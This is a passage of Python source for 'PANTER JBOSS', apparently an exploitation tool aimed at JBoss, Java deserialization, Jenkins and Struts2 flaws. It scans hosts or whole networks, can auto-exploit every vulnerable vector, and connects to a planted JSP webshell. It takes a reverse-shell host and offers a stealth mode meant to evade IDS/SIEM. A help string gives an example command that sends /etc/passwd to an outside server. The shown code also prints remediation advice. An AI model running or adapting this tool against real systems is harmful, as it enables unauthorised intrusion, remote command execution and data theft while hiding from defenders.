     GREEN + "\n  $ python panterjboss.py -u http://vulnerable_java_app/path --servlet-unserialize\n" +

     BLUE + "\n\n To test Java Deserialization Vulnerabilities with DNS Lookup:\n" +
     GREEN + "\n  $ python panterjboss.py -u http://vulnerable_java_app/path --gadget dns --dns test.yourdomain.com" +

     BLUE + "\n\n For Jenkins CLI Deserialization Vulnerabilitie:\n"+
     GREEN + "\n  $ python panterjboss.py -u http://vulnerable_java_app/jenkins --jenkins"+

     BLUE + "\n\n For Apache Struts2 Vulnerabilities (CVE-2017-5638):\n" +
     GREEN + "\n  $ python panterjboss.py -u http://vulnerable_java_app/path.action --struts2\n" +

     BLUE + "\n\n For auto scan mode, you must provide the network in CIDR format, "
   "\n list of ports and filename for store results:\n" +
    GREEN + "\n  $ python panterjboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 \n"
            "    -results report_auto_scan.log" +

    BLUE + "\n\n For file scan mode, you must provide the filename with host list "
           "\n to be scanned (one host per line) and filename for store results:\n" +
    GREEN + "\n  $ python panterjboss.py -mode file-scan -file host_list.txt -out report_file_scan.log\n" + ENDC)
    return usage


def network_args(string):
    try:
        if version_info[0] >= 3:
            value = ipaddress.ip_network(string)
        else:
            value = ipaddress.ip_network(unicode(string))
    except:
        msg = "%s is not a network address in CIDR format." % string
        logging.error("%s is not a network address in CIDR format." % string)
        raise argparse.ArgumentTypeError(msg)
    return value


def main():
    """
    Run interactively. Call when the module is run by itself.
    :return: Exit code
    """
    # check for Updates
    if not gl_args.disable_check_updates:
        updates = _updates.check_updates()
        if updates:
            print_and_flush(BLUE + BOLD + "\n\n * Hay una actualizacion disponible y se recomienda actualizar antes de continuar.\n" +
                                          "   Desea actualizar ahora?")
            if not sys.stdout.isatty():
                print_and_flush("   SI/no? ", same_line=True)
                pick = input().lower() if version_info[0] >= 3 else raw_input().lower()
            else:
                pick = input("   SI/no? ").lower() if version_info[0] >= 3 else raw_input("   SI/no? ").lower()

            print_and_flush(ENDC)
            if pick != "no":
                updated = _updates.auto_update()
                if updated:
                    print_and_flush(GREEN + BOLD + "\n * PANTER JBOSS ha sido actualizado correctamente.\n" +ENDC)
                    exit(0)
                else:
                    print_and_flush(RED + BOLD + "\n\n * Error al actualizar PANTER JBOSS. Intenta de nuevo.\n" +ENDC)
                    exit(1)

    # ── MENU PRINCIPAL ──────────────────────────────────────────────────
    if gl_args.mode == 'standalone':
        target_display = gl_args.host or "No definido"
        print_and_flush(
            CYAN + BOLD +
            "\n  ╔══════════════════════════════════════════════════════╗\n"
            "  ║              PANTER JBOSS  —  MENU PRINCIPAL         ║\n"
            "  ║  Target : %-43s║\n" % (target_display[:43] + " ") +
            "  ╠══════════════════════════════════════════════════════╣\n" + ENDC +
            GREEN +
            "  ║  [1] Escanear y explotar objetivo                    ║\n"
            "  ║  [2] Solo escanear (sin explotar)                    ║\n"
            "  ║  [3] Conectar a shell existente (ya explotado)       ║\n" + ENDC +
            RED + BOLD +
            "  ║  [0] Salir                                           ║\n" + ENDC +
            CYAN + BOLD +
            "  ╚══════════════════════════════════════════════════════╝\n" + ENDC
        )
        if not sys.stdout.isatty():
            print_and_flush("  Seleccione una opcion: ")
            _opcion_principal = input().strip()
        else:
            _opcion_principal = input(YELLOW + BOLD + "  Seleccione una opcion: " + ENDC).strip()

        if _opcion_principal == "0":
            print_and_flush(CYAN + "\n  [*] Saliendo...\n" + ENDC)
            return
        elif _opcion_principal == "3":
            # Conectar directo a una shell ya deployada
            _shell_url = gl_args.host
            _shell_path = "/panterws/panterws.jsp?"
            _shell_headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                              "Connection": "keep-alive", "no-check-updates": "true",
                              "User-Agent": get_random_user_agent()}
            print_and_flush(GREEN + "\n  [*] Conectando a shell en %s%s\n" % (_shell_url, _shell_path) + ENDC)
            _postexploit.run_menu(
                http_pool       = gl_http_pool,
                url             = _shell_url,
                path            = _shell_path,
                headers         = _shell_headers,
                add_credential_fn = add_credential,
                shell_fn        = lambda: None,
                check_vul_fn    = check_vul,
                auto_exploit_fn = auto_exploit,
                gl_args         = gl_args,
            )
            return
        # opciones 1 y 2 continúan con el flujo normal
        _solo_scan = (_opcion_principal == "2")
    else:
        _solo_scan = False
    # ────────────────────────────────────────────────────────────────────

    vulnerables = False
    vuln_vectors = []
    scan_start_time = datetime.datetime.now()
    analyst_name = gl_args.analyst

    def _write_report_header(fh, mode_label, target_info=""):
        fh.write("=" * 62 + "\n")
        fh.write("  PANTER JBOSS - JBoss & Java Deserialization Scanner\n")
        fh.write("=" * 62 + "\n")
        fh.write("  Analyst   : {0}\n".format(analyst_name))
        fh.write("  Version   : {0}\n".format(__version__))
        fh.write("  Mode      : {0}\n".format(mode_label))
        fh.write("  Date      : {0}\n".format(scan_start_time.strftime("%Y-%m-%d %H:%M:%S")))
        if target_info:
            fh.write("  Target    : {0}\n".format(target_info))
        fh.write("=" * 62 + "\n\n")
        fh.write("{:<50} {:<}\n".format("Target", "Status"))
        fh.write("-" * 62 + "\n")

    # check vulnerabilities for standalone mode
    if gl_args.mode == 'standalone':
        url = gl_args.host
        session_data['hosts_escaneados'].append(url)
        scan_results = check_vul(url)
        # recolectar vectores vulnerables
        for vector in scan_results:
            if scan_results[vector] == 200 or scan_results[vector] == 500:
                vulnerables = True
                vuln_vectors.append((url, vector))
                session_data['vulnerabilidades'].append({'host': url, 'vector': vector, 'estado': 'VULNERABLE'})

        # preguntar UNA SOLA VEZ si desea explotar
        if vulnerables and not gl_args.auto_exploit and not _solo_scan:
            print_and_flush(BLUE + "\n\n * Se detectaron " + BOLD + str(len(vuln_vectors)) + NORMAL +
                  " vector(es) vulnerables. ¿Desea intentar explotacion automatizada?\n" +
                  "   Si tiene exito, se proveeera una shell de comandos en el servidor.\n" +
                  RED + "   Continue solo si tiene permiso!" + ENDC)
            if not sys.stdout.isatty():
                print_and_flush("   si/NO? ", same_line=True)
                pick = input().lower() if version_info[0] >= 3 else raw_input().lower()
            else:
                pick = input("   si/NO? ").lower() if version_info[0] >= 3 else raw_input("   si/NO? ").lower()

            if pick in ("si", "s", "y", "yes"):
                # intentar vectores en orden, detenerse al primero exitoso
                for (_, vector) in vuln_vectors:
                    result = auto_exploit(url, vector)
                    if result:
                        break
        elif gl_args.auto_exploit and not _solo_scan:
            # en modo auto-exploit, también parar al primer vector exitoso
            for (_, vector) in vuln_vectors:
                result = auto_exploit(url, vector)
                if result:
                    break

    # check vulnerabilities for auto scan mode
    elif gl_args.mode == 'auto-scan':
        vuln_count = 0
        file_results = open(gl_args.results, 'w')
        _write_report_header(file_results, "Auto Network Scan", str(gl_args.network))
        for ip in gl_args.network.hosts():
            if gl_interrupted: break
            for port in gl_args.ports.split(","):
                if check_connectivity(ip, port):
                    url = "{0}:{1}".format(ip,port)
                    ip_results = check_vul(url)
                    for key in ip_results.keys():
                        if ip_results[key] == 200 or ip_results[key] == 500:
                            vulnerables = True
                            vuln_count += 1
                            vuln_vectors.append((url, key))
                            if gl_args.auto_exploit:
                                result_exploit = auto_exploit(url, key)
                                if result_exploit:
                                    file_results.write("[EXPLOITED]          {0} via {1}\n".format(url, key))
                                else:
                                    file_results.write("[EXPLOIT FAILED]     {0} via {1}\n".format(url, key))
                            else:
                                file_results.write("[VULNERABLE]         {0} via {1}\n".format(url, key))

                            file_results.flush()
                else:
                    print_and_flush (RED+"\n * El host %s:%s no responde."% (ip,port)+ENDC)
        scan_end_time = datetime.datetime.now()
        file_results.write("\n" + "-" * 62 + "\n")
        file_results.write("  Scan completed : {0}\n".format(scan_end_time.strftime("%Y-%m-%d %H:%M:%S")))
        file_results.write("  Duration       : {0}\n".format(str(scan_end_time - scan_start_time).split('.')[0]))
        file_results.write("  Vulnerabilities: {0}\n".format(vuln_count))
        file_results.write("  Analyst        : {0}\n".format(analyst_name))
        file_results.write("=" * 62 + "\n")
        file_results.close()
    # check vulnerabilities for file scan mode
    elif gl_args.mode == 'file-scan':
        vuln_count = 0
        file_results = open(gl_args.out, 'w')
        _write_report_header(file_results, "File Scan", gl_args.file)
        file_input = open(gl_args.file, 'r')
        for url in file_input.readlines():
            if gl_interrupted: break
            url = url.strip()
            ip = str(parse_url(url)[2])
            port = parse_url(url)[3] if parse_url(url)[3] != None else 80
            if check_connectivity(ip, port):
                url_results = check_vul(url)
                for key in url_results.keys():
                    if url_results[key] == 200 or url_results[key] == 500:
                        vulnerables = True
                        vuln_count += 1
                        vuln_vectors.append((url, key))
                        if gl_args.auto_exploit:
                            result_exploit = auto_exploit(url, key)
                            if result_exploit:
                                file_results.write("[EXPLOITED]          {0} via {1}\n".format(url, key))
                            else:
                                file_results.write("[EXPLOIT FAILED]     {0} via {1}\n".format(url, key))
                        else:
                            file_results.write("[VULNERABLE]         {0} via {1}\n".format(url, key))

                        file_results.flush()
            else:
                print_and_flush (RED + "\n * El host %s:%s no responde." % (ip, port) + ENDC)
        scan_end_time = datetime.datetime.now()
        file_results.write("\n" + "-" * 62 + "\n")
        file_results.write("  Scan completed : {0}\n".format(scan_end_time.strftime("%Y-%m-%d %H:%M:%S")))
        file_results.write("  Duration       : {0}\n".format(str(scan_end_time - scan_start_time).split('.')[0]))
        file_results.write("  Vulnerabilities: {0}\n".format(vuln_count))
        file_results.write("  Analyst        : {0}\n".format(analyst_name))
        file_results.write("=" * 62 + "\n")
        file_results.close()

    # resume results
    if vulnerables:
        print_and_flush(RED + BOLD +
            "\n ╔══════════════════════════════════════════════════════╗\n"
            " ║   [!] RESULTADO: SERVIDOR POTENCIALMENTE VULNERADO   ║\n"
            " ╚══════════════════════════════════════════════════════╝" + ENDC)
        if gl_args.mode == 'file-scan':
            print_and_flush(YELLOW + BOLD + "\n [*] Reporte guardado en: " + ENDC + WHITE + gl_args.out + ENDC)
        elif gl_args.mode == 'auto-scan':
            print_and_flush(YELLOW + BOLD + "\n [*] Reporte guardado en: " + ENDC + WHITE + gl_args.results + ENDC)

        # Mostrar vectores detectados
        print_and_flush(
            CYAN + "\n ┌─── VECTORES DETECTADOS " + "─" * 38 + "┐\n" + ENDC)
        for (_target, _vector) in vuln_vectors:
            print_and_flush(
                RED + " │  [!] " + ENDC + WHITE + BOLD + "%-32s" % _vector + ENDC +
                YELLOW + " →  " + ENDC + WHITE + _target + ENDC + "\n")
        print_and_flush(
            CYAN + " └" + "─" * 62 + "┘\n" + ENDC)

        print_and_flush(
            CYAN + "\n ┌─── RECOMENDACIONES DE REMEDIACIÓN " + "─" * 26 + "┐\n" + ENDC +
            GREEN + " │\n"
                    " │  [JBoss]\n"
                    " │  • Eliminar consolas web no utilizadas:\n"
                    " │    $ rm web-console.war http-invoker.sar jmx-console.war \\\n"
                    " │         jmx-invoker-adaptor-server.sar admin-console.war\n"
                    " │  • Usar reverse proxy (nginx, Apache, F5) y restringir\n"
                    " │    acceso directo al servidor (DROP INPUT POLICY)\n"
                    " │  • Buscar vestigios de explotación en directorios\n"
                    " │    \"deploy\" y \"management\"\n"
                    " │\n"
                    " │  [Deserialización Java]\n"
                    " │  • No confiar en objetos serializados recibidos del usuario\n"
                    " │  • Si es posible, dejar de usar objetos serializados como entrada\n"
                    " │  • Para serialización necesaria, migrar a la librería Gson\n"
                    " │  • Implementar whitelist estricta con Look-ahead[3] antes\n"
                    " │    de deserializar\n"
                    " │  • Para viewState: cambiar \"client\" a \"server\" en\n"
                    " │    STATE_SAVING_METHOD en web.xml\n"
                    " │\n"
                    " │  [Apache Struts2]\n"
                    " │  • Actualizar Apache Struts a la última versión disponible\n"
                    " │    Ref: https://cwiki.apache.org/confluence/display/WW/S2-045\n"
                    " │\n"
                    " │  Si el servidor fue comprometido: considerar descartarlo.\n"
                    " │\n" + ENDC +
            CYAN +  " ├─── REFERENCIAS " + "─" * 44 + "┤\n" + ENDC +
            GREEN + " │  [1] https://developer.jboss.org/wiki/SecureTheJmxConsole\n"
                    " │  [2] https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\n"
                    " │  [3] https://www.ibm.com/developerworks/library/se-lookahead/\n"
                    " │  [4] https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data\n" + ENDC +
            CYAN +  " └" + "─" * 61 + "┘\n" + ENDC)
    else:
        print_and_flush(GREEN + BOLD +
            "\n ╔══════════════════════════════════════════════════════╗\n"
            " ║   [+] RESULTADO: SIN VULNERABILIDADES DETECTADAS     ║\n"
            " ╚══════════════════════════════════════════════════════╝\n" + ENDC)
    # Mostrar tabla resumen de credenciales si se encontro alguna
    print_credentials_table()

    # ── Generar reporte HTML automaticamente ────────────────────────────
    try:
        import _reporter
        _scan_end = datetime.datetime.now()
        session_data['analyst']      = gl_args.analyst
        session_data['version']      = __version__
        session_data['fecha_inicio'] = scan_start_time.strftime("%Y-%m-%d %H:%M:%S")
        session_data['fecha_fin']    = _scan_end.strftime("%Y-%m-%d %H:%M:%S")
        session_data['credenciales'] = found_credentials
        _html_path = _reporter.generar_reporte(session_data)
        print_and_flush(YELLOW + BOLD + "\n [*] Reporte HTML generado: " + ENDC + WHITE + _html_path + ENDC)
    except Exception as _e:
        print_and_flush(RED + "\n [!] No se pudo generar el reporte HTML: %s" % str(_e) + ENDC)
    # ─────────────────────────────────────────────────────────────────────

    # infos
    print_and_flush(YELLOW + BOLD + "\n [*] Analista : " + ENDC + WHITE + gl_args.analyst + ENDC +
                    "  |  " + CYAN + "PANTER JBOSS v" + ENDC + WHITE + __version__ + ENDC + "\n")


print_and_flush(ENDC)

#banner()


if __name__ == "__main__":


    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=textwrap.dedent(
        RED  + "\n"
        "             ░░░░░░░░░░░░░░░░░░░░░░░░░             \n"
        "          ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░         \n"
        "        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░       \n"
        "       ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░      \n"
        "      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░     \n"
        "      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░     \n"
        "      ░░░░░░░   \\░░░░░░░░░░░   ░░░░░░░░░░░░░░░    \n"
        "      ░░░░░░░  ░░\\░░░░░░░░░░░   ░░░░░░░░░░░░░░░   \n"
        "      ░░░░░░░ ░░░░\\░░░░░░░░░░░   ░░░░░░░░░░░░░░   \n"
        "      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░    \n"
        "      ░░░░░░░░░░░░░░░░░  ░░░░░░░░░░░░░░░░░░░░░░    \n"
        "      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░    \n"
        "       ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░     \n"
        "        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░      \n"
        "         ░░  ░░  ░░  ░░  ░░  ░░  ░░  ░░  ░░       \n"
        "               ░░░░░░░░░░░░░░░░░░░░░░░             \n"
        "   ░░░░░░                             ░░░░░░        \n"
        "   ░░░░░░░░░░                   ░░░░░░░░░░░░        \n"
        "      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░          \n"
        "           ░░░░░░░░░░░░░░░░░░░░░░░░░░              \n"
        "                 ░░░░░░░░░░░░░░░░░                  \n"
        "           ░░░░░░░░░░░░░░░░░░░░░░░░░░              \n"
        "      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░          \n"
        "   ░░░░░░░░░░░                   ░░░░░░░░░░░░        \n"
        "   ░░░░░░                             ░░░░░░        \n" + ENDC +
        RED  + BOLD +
        "   ╔══════════════════════════════════════════════╗\n"
        "   ║%s║\n" % "PANTER JBOSS  v1.3.0".center(46) +
        "   ╠══════════════════════════════════════════════╣\n" + ENDC +
        YELLOW + BOLD +
        "   ║%s║\n" % "Analista : Apo1o13".center(46) + ENDC +
        RED  + BOLD +
        "   ╠══════════════════════════════════════════════╣\n" + ENDC +
        CYAN +
        "   ║  %-44s║\n" % ("Version  : " + __version__) + ENDC +
        RED  + BOLD +
        "   ╚══════════════════════════════════════════════╝\n" + ENDC +
        "\n" + help_usage()),
        epilog="",
        prog="PANTER JBOSS"
    )

    group_standalone = parser.add_argument_group('Standalone mode')
    group_advanced = parser.add_argument_group('Advanced Options (USE WHEN EXPLOITING JAVA UNSERIALIZE IN APP LAYER)')
    group_auto_scan = parser.add_argument_group('Auto scan mode')
    group_file_scan = parser.add_argument_group('File scan mode')

    # optional parameters ---------------------------------------------------------------------------------------
    parser.add_argument('--version', action='version', version='%(prog)s ' + __version__)
    parser.add_argument("--auto-exploit", "-A", help="Send exploit code automatically (USE ONLY IF YOU HAVE PERMISSION!!!)",
                        action='store_true')
    parser.add_argument("--disable-check-updates", "-D", help="Disable update checks performed by the webshell and the client.",
                        action='store_true')
    parser.add_argument('-mode', help="Operation mode (DEFAULT: standalone)", choices=['standalone', 'auto-scan', 'file-scan'], default='standalone')
    parser.add_argument("--app-unserialize", "-j",
                        help="Check for java unserialization vulnerabilities in HTTP parameters (eg. javax.faces.ViewState, "
                             "oldFormData, etc)", action='store_true')
    parser.add_argument("--servlet-unserialize", "-l",
                        help="Check for java unserialization vulnerabilities in Servlets (like Invoker interfaces)",
                        action='store_true')
    parser.add_argument("--jboss", help="Check only for JBOSS vectors.", action='store_true')
    parser.add_argument("--jenkins",  help="Check only for Jenkins CLI vector (CVE-2015-5317).", action='store_true')
    parser.add_argument("--struts2", help="Check only for Struts2 Jakarta Multipart parser (CVE-2017-5638).", action='store_true')
    parser.add_argument("--jmxtomcat", help="Check JMX JmxRemoteLifecycleListener in Tomcat (CVE-2016-8735 and "
                                            "CVE-2016-3427). OBS: Will not be checked by default.", action='store_true')

    parser.add_argument('--proxy', "-P", help="Use a http proxy to connect to the target URL (eg. -P http://192.168.0.1:3128)", )
    parser.add_argument('--proxy-cred', "-L", help="Proxy authentication credentials (eg -L name:password)", metavar='LOGIN:PASS')
    parser.add_argument('--jboss-login', "-J", help="JBoss login and password for exploit admin-console in JBoss 5 and JBoss 6 "
                                                    "(default: admin:admin)", metavar='LOGIN:PASS', default='admin:admin')
    parser.add_argument('--timeout', help="Seconds to wait before timeout connection (default 3)", default=3, type=int)
    parser.add_argument('--stealth', '-S', help="Modo sigilo: delays aleatorios + rotacion de User-Agent para evadir IDS/SIEM",
                        action='store_true')

    parser.add_argument('--cookies', help="Specify cookies for Struts 2 Exploit. Use this to test features that require authentication. "
                                         "Format: \"NAME1=VALUE1; NAME2=VALUE2\" (eg. --cookie \"JSESSIONID=24517D9075136F202DCE20E9C89D424D\""
                        , type=str, metavar='NAME=VALUE')
    parser.add_argument('--analyst', help="Analyst name to include in reports and banner (default: Apo1o13)",
                        type=str, default=__analyst__, metavar='NAME')
    #parser.add_argument('--retries', help="Retries when the connection timeouts (default 3)", default=3, type=int)

    # advanced parameters ---------------------------------------------------------------------------------------
    group_advanced.add_argument("--reverse-host", "-r", help="Remote host address and port for reverse shell when exploiting "
                                                             "Java Deserialization Vulnerabilities in application layer "
                                                             "(for now, working only against *nix systems)"
                                                             "(eg. 192.168.0.10:1331)", type=str, metavar='RHOST:RPORT')
    group_advanced.add_argument("--cmd", "-x",
                                help="Send specific command to run on target (eg. curl -d @/etc/passwd http://your_server)"
                                     , type=str, metavar='CMD')
    group_advanced.add_argument("--dns", help="Specifies the dns query for use with \"dns\" Gadget", type=str, metavar='URL')
    group_advanced.add_argument("--windows", "-w", help="Specifies that the commands are for rWINDOWS System$ (cmd.exe)",
                                action='store_true')
    group_advanced.add_argument("--post-parameter", "-H", help="Specify the parameter to find and inject serialized objects into it."
                                                               " (egs. -H javax.faces.ViewState or -H oldFormData (<- Hi PayPal =X) or others)"
                                                               " (DEFAULT: javax.faces.ViewState)",
                                                                 default='javax.faces.ViewState', metavar='PARAMETER')
    group_advanced.add_argument("--show-payload", "-t", help="Print the generated payload.",
                                action='store_true')
    group_advanced.add_argument("--gadget", help="Specify the type of Gadget to generate the payload automatically."
                                                 " (DEFAULT: commons-collections3.1 or groovy1 for JenKins)",
                                    choices=['commons-collections3.1', 'commons-collections4.0', 'jdk7u21', 'jdk8u20', 'groovy1', 'dns'],
                                    default='commons-collections3.1')
    group_advanced.add_argument("--load-gadget", help="Provide your own gadget from file (a java serialized object in RAW mode)",
                                metavar='FILENAME')
    group_advanced.add_argument("--force", "-F",
                                help="Force send java serialized gadgets to URL informed in -u parameter. This will "
                                     "send the payload in multiple formats (eg. RAW, GZIPED and BASE64) and with "
                                     "different Content-Types.",action='store_true')

    # required parameters ---------------------------------------------------------------------------------------
    group_standalone.add_argument("-host", "-u", help="Host address to be checked (eg. -u http://192.168.0.10:8080)",
                                  type=str)

    # scan's mode parameters ---------------------------------------------------------------------------------------
    group_auto_scan.add_argument("-network", help="Network to be checked in CIDR format (eg. 10.0.0.0/8)",
                            type=network_args, default='192.168.0.0/24')
    group_auto_scan.add_argument("-ports", help="List of ports separated by commas to be checked for each host "
                                                "(eg. 8080,8443,8888,80,443)", type=str, default='8080,80')
    group_auto_scan.add_argument("-results", help="File name to store the auto scan results", type=str,
                                 metavar='FILENAME', default='panterjboss_auto_scan_results.log')

    group_file_scan.add_argument("-file", help="Filename with host list to be scanned (one host per line)",
                                 type=str, metavar='FILENAME_HOSTS')
    group_file_scan.add_argument("-out", help="File name to store the file scan results", type=str,
                                 metavar='FILENAME_RESULTS', default='panterjboss_file_scan_results.log')

    gl_args = parser.parse_args()

    if (gl_args.mode == 'standalone' and gl_args.host is None) or \
        (gl_args.mode == 'file-scan' and gl_args.file is None) or \
        (gl_args.gadget == 'dns' and gl_args.dns is None):
        banner()
        print (help_usage())
        exit(0)
    else:
        configure_http_pool()
        _updates.set_http_pool(gl_http_pool)
        _exploits.set_http_pool(gl_http_pool)
        banner()
        if gl_args.proxy and not is_proxy_ok():
            exit(1)
        if gl_args.gadget == 'dns': gl_args.cmd = gl_args.dns
        main()

if __name__ == '__testing__':
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}

    timeout = Timeout(connect=1.0, read=3.0)
    gl_http_pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')
    _exploits.set_http_pool(gl_http_pool)


